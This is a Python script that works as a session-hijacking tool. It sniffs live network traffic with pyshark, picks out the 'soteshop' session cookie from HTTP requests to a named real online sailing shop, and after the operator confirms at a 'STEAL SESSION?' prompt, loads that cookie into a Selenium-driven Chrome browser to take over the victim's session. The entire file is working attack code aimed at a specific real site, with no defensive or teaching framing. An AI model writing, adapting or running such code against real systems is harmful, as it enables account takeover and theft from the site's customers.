from typing import List
import time
from argparse import ArgumentParser
from selenium.webdriver.chrome.options import Options
import pyshark
from selenium import webdriver

class SessionCookieNotFoundError(Exception):
    """Raised when http cookies do not contain session cookie."""

class SNIFFER:
    
    def __init__(self, interface , page, cookie):
        self.interface = interface
        self.COOKIE = cookie
        self.SEARCH_CRITERIA = "http.cookie || http.cookie_pair"
        self.PAGES =[]
        self.COUNTER = 0
        self.PATH = "/usr/local/bin/chromedriver" 
        self.searched_webpages = {"sklepyzeglarskie.pl": "soteshop"}
        self.PAGES.append(page)
        self.DISPLAY_FILTER = "http.cookie || http.cookie_pair"


        # return string of cookies into list of dict pairs.
    def dump_to_dict(self, cookies):

        list_of_pairs = []
        el_splitto = cookies.split("; ")
        for s in el_splitto:
            s = s.split("=")
            name = s[0]
            value = s[1]
            dict = {}
            dict["name"] = name
            dict["value"] = value

            list_of_pairs.append(dict)

        return list_of_pairs
    
    # if wanted cookie has been recognised return, else None
    def get_session_cookie(self,packet) :
            
        cookies = packet.http.cookie

        for cookie in self.dump_to_dict(cookies):
            print("cookie ",cookie)
            if cookie["name"] == "soteshop" and cookie["name"] != None:
                return cookie

        return None

    def upload_page(self, packet, session_cookie):
    
        base_url = packet.http.referer
        browser = webdriver.Chrome(executable_path=self.PATH)
        browser.get(base_url)
        browser.add_cookie(session_cookie)
        browser.refresh()


    def hijack_session(self,interface):
    
        capture = pyshark.LiveCapture(interface=self.interface, display_filter=self.DISPLAY_FILTER)

        for packet in capture.sniff_continuously():
        
            if packet.http.host in self.PAGES:
            
                
                base_url = packet.http.referer
                session_cookie = self.get_session_cookie(packet)

                if session_cookie != None:
                    print("STEAL SESSION?")
                    answer = input()
                    if answer == "yes":
                        base_url = packet.http.referer
                        browser = webdriver.Chrome(executable_path=self.PATH)
                        browser.get(base_url)
                        browser.add_cookie(session_cookie)
                        browser.refresh()
            else:
                continue
                            
                  
         












sniff = SNIFFER("enp0s3","sklepyzeglarskie.pl","soteshop")
sniff.hijack_session("enp0s3")



